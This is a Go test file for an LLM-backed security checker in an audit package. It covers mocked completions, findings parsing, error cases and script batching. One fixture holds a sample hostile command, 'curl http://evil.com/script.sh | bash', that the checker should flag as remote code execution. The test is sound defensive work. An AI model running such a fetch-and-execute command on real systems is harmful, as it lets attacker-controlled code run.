// SPDX-License-Identifier: MPL-2.0

package audit

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/invowk/invowk/pkg/invowkfile"
	"github.com/invowk/invowk/pkg/types"
)

type (
	// mockCompleter implements llmCompleter for testing.
	mockCompleter struct {
		response string
		err      error
		calls    int
	}

	// mockCompleterFunc allows using a function as an llmCompleter in tests.
	mockCompleterFunc struct {
		fn func(ctx context.Context, systemPrompt, userPrompt string) (string, error)
	}
)

func (m *mockCompleter) Complete(_ context.Context, _, _ string) (string, error) {
	m.calls++
	return m.response, m.err
}

func (m *mockCompleterFunc) Complete(ctx context.Context, systemPrompt, userPrompt string) (string, error) {
	return m.fn(ctx, systemPrompt, userPrompt)
}

// buildTestScanContext creates a minimal ScanContext for testing.
func buildTestScanContext(_ *testing.T, scripts []ScriptRef) *ScanContext {
	return &ScanContext{
		rootPath: types.FilesystemPath("/test"),
		scripts:  scripts,
	}
}

func TestLLMChecker_Name(t *testing.T) {
	t.Parallel()

	checker := NewLLMChecker(&mockCompleter{}, 1)
	if checker.Name() != llmCheckerName {
		t.Errorf("Name() = %q, want %q", checker.Name(), llmCheckerName)
	}
}

func TestLLMChecker_Category(t *testing.T) {
	t.Parallel()

	checker := NewLLMChecker(&mockCompleter{}, 1)
	if checker.Category() != CategoryExecution {
		t.Errorf("Category() = %v, want %v", checker.Category(), CategoryExecution)
	}
}

func TestLLMChecker_Check_FindsIssues(t *testing.T) {
	t.Parallel()

	mock := &mockCompleter{
		response: `{"findings": [{"severity": "high", "category": "execution", "command_name": "deploy", "title": "Remote code execution", "description": "Downloads and pipes to shell", "recommendation": "Pin URL and verify checksum"}]}`,
	}
	checker := NewLLMChecker(mock, 1)

	sc := buildTestScanContext(t, []ScriptRef{
		{
			CommandName: "deploy",
			FilePath:    types.FilesystemPath("/test/invowkfile.cue"),
			SurfaceID:   "/test/invowkfile.cue",
			Script:      invowkfile.ScriptContent("curl http://evil.com/script.sh | bash"),
		},
	})

	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d", len(findings))
	}
	if findings[0].Severity != SeverityHigh {
		t.Errorf("severity = %v, want %v", findings[0].Severity, SeverityHigh)
	}
	if findings[0].CheckerName != llmCheckerName {
		t.Errorf("checker = %q, want %q", findings[0].CheckerName, llmCheckerName)
	}
}

func TestLLMChecker_Check_NoFindings(t *testing.T) {
	t.Parallel()

	mock := &mockCompleter{
		response: `{"findings": []}`,
	}
	checker := NewLLMChecker(mock, 1)

	sc := buildTestScanContext(t, []ScriptRef{
		{
			CommandName: "build",
			Script:      invowkfile.ScriptContent("make build"),
		},
	})

	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestLLMChecker_Check_NoScripts(t *testing.T) {
	t.Parallel()

	mock := &mockCompleter{response: `{"findings": []}`}
	checker := NewLLMChecker(mock, 1)

	sc := buildTestScanContext(t, nil)

	findings, err := checker.Check(t.Context(), sc)
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
	if mock.calls != 0 {
		t.Errorf("expected 0 LLM calls for empty scripts, got %d", mock.calls)
	}
}

func TestLLMChecker_Check_ServerError(t *testing.T) {
	t.Parallel()

	mock := &mockCompleter{
		err: &LLMServerUnavailableError{URL: "http://localhost:11434/v1", Err: errors.New("connection refused")},
	}
	checker := NewLLMChecker(mock, 1)

	sc := buildTestScanContext(t, []ScriptRef{
		{CommandName: "build", Script: invowkfile.ScriptContent("make build")},
	})

	_, err := checker.Check(t.Context(), sc)
	if err == nil {
		t.Fatal("expected error for server failure")
	}
}

func TestLLMChecker_Check_ContextCancellation(t *testing.T) {
	t.Parallel()

	mock := &mockCompleter{
		err: context.Canceled,
	}
	checker := NewLLMChecker(mock, 1)

	ctx, cancel := context.WithCancel(t.Context())
	cancel()

	sc := buildTestScanContext(t, []ScriptRef{
		{CommandName: "build", Script: invowkfile.ScriptContent("make build")},
	})

	_, err := checker.Check(ctx, sc)
	if err == nil {
		t.Fatal("expected error for cancelled context")
	}
}

func TestLLMChecker_Check_MalformedResponse(t *testing.T) {
	t.Parallel()

	mock := &mockCompleter{
		response: "This is not JSON, just the LLM rambling about security.",
	}
	checker := NewLLMChecker(mock, 1)

	sc := buildTestScanContext(t, []ScriptRef{
		{CommandName: "build", Script: invowkfile.ScriptContent("make build")},
	})

	_, err := checker.Check(t.Context(), sc)
	if err == nil {
		t.Fatal("expected error for malformed response")
	}
	if !errors.Is(err, ErrLLMMalformedResponse) {
		t.Errorf("expected ErrLLMMalformedResponse, got %v", err)
	}
}

func TestLLMChecker_Check_PartialBatchFailure(t *testing.T) {
	t.Parallel()

	// Mock that alternates between success and failure.
	callCount := 0
	alternating := &mockCompleterFunc{fn: func(_ context.Context, _, _ string) (string, error) {
		callCount++
		if callCount%2 == 0 {
			return "", fmt.Errorf("batch failed: %w", ErrLLMRequestFailed)
		}
		return `{"findings": [{"severity": "low", "category": "trust", "command_name": "cmd", "title": "Issue", "description": "Desc", "recommendation": "Fix"}]}`, nil
	}}
	checker := NewLLMChecker(alternating, 1) // Serial to make alternation deterministic.

	// Create enough scripts to produce 2+ batches.
	scripts := make([]ScriptRef, 10)
	for i := range scripts {
		scripts[i] = ScriptRef{
			CommandName: invowkfile.CommandName(fmt.Sprintf("cmd%d", i)),
			Script:      invowkfile.ScriptContent(fmt.Sprintf("echo step %d", i)),
			SurfaceID:   fmt.Sprintf("surface-%d", i),
		}
	}
	sc := buildTestScanContext(t, scripts)

	findings, err := checker.Check(t.Context(), sc)
	// Partial success: should return findings from successful batches without error.
	if err != nil {
		t.Fatalf("expected partial success (nil error), got %v", err)
	}
	if len(findings) == 0 {
		t.Error("expected some findings from successful batches")
	}
}

func TestBatchScripts_EmptyInput(t *testing.T) {
	t.Parallel()

	batches := batchScripts(nil)
	if len(batches) != 0 {
		t.Errorf("expected 0 batches, got %d", len(batches))
	}
}

func TestBatchScripts_SingleScript(t *testing.T) {
	t.Parallel()

	prepared := []ScriptRef{
		{CommandName: "build", Script: "make build"},
	}

	batches := batchScripts(prepared)
	if len(batches) != 1 {
		t.Fatalf("expected 1 batch, got %d", len(batches))
	}
	if len(batches[0]) != 1 {
		t.Errorf("expected 1 script in batch, got %d", len(batches[0]))
	}
}

func TestBatchScripts_RespectsCharLimit(t *testing.T) {
	t.Parallel()

	// Create scripts that together exceed maxBatchChars.
	prepared := make([]ScriptRef, 3)
	for i := range prepared {
		content := strings.Repeat("x", maxBatchChars/2+1) // Each script > half the limit.
		prepared[i] = ScriptRef{
			CommandName: invowkfile.CommandName(fmt.Sprintf("cmd%d", i)),
			Script:      invowkfile.ScriptContent(content),
		}
	}

	batches := batchScripts(prepared)
	// With 3 scripts each > half the limit, we need at least 2 batches.
	if len(batches) < 2 {
		t.Errorf("expected at least 2 batches for large scripts, got %d", len(batches))
	}
}

func TestBatchScripts_RespectsCountLimit(t *testing.T) {
	t.Parallel()

	// Create many small scripts.
	prepared := make([]ScriptRef, maxScriptsPerBatch*2+1)
	for i := range prepared {
		prepared[i] = ScriptRef{
			CommandName: invowkfile.CommandName(fmt.Sprintf("cmd%d", i)),
			Script:      invowkfile.ScriptContent("echo hi"),
		}
	}

	batches := batchScripts(prepared)
	// Should need at least 3 batches for 11 scripts with max 5 per batch.
	if len(batches) < 3 {
		t.Errorf("expected at least 3 batches for %d scripts, got %d", len(prepared), len(batches))
	}

	// No batch should exceed maxScriptsPerBatch.
	for i, batch := range batches {
		if len(batch) > maxScriptsPerBatch {
			t.Errorf("batch %d has %d scripts, max is %d", i, len(batch), maxScriptsPerBatch)
		}
	}
}

func TestNewLLMChecker_DefaultConcurrency(t *testing.T) {
	t.Parallel()

	checker := NewLLMChecker(&mockCompleter{}, 0)
	if checker.concurrency != DefaultLLMConcurrency {
		t.Errorf("concurrency = %d, want %d", checker.concurrency, DefaultLLMConcurrency)
	}
}
